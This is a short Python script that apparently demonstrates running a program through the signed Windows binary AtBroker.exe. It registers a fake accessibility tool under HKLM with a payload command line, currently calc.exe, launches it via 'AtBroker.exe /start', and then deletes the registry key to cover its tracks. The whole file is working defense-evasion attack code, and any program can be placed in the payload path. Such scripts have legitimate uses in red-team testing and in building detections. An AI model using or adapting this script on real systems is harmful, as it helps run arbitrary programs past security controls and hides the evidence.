import os
import subprocess
import sys
import winreg
import time

## Administrative Privileges Required ##

ATBROKER_PATH = r"C:\Windows\System32\AtBroker.exe"
PAYLOAD_PATH = os.path.join(os.environ['WINDIR'], 'System32', "calc.exe")
REG_KEY = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\Calculator"

def payload():
    try:
        with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, REG_KEY) as key:
            winreg.SetValueEx(key, "Name", 0, winreg.REG_SZ, "Calculator")
            winreg.SetValueEx(key, "CommandLine", 0, winreg.REG_SZ, PAYLOAD_PATH)
            winreg.SetValueEx(key, "Integration", 0, winreg.REG_DWORD, 1)
        return True
    except Exception as e:
        return False

def atbroker_proxy():
    try:
        subprocess.run([
            ATBROKER_PATH,
            "/start",
            "Calculator"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
    except Exception as e:
        sys.exit(1)

def cleanup():
    try:
        winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, REG_KEY)
    except Exception as e:
        sys.exit(1)

def main():    
    if not os.path.exists(PAYLOAD_PATH):
        sys.exit(1)
    if not payload():
        sys.exit(1)

    time.sleep(2)
    atbroker_proxy()
    cleanup()

if __name__ == "__main__":
    main()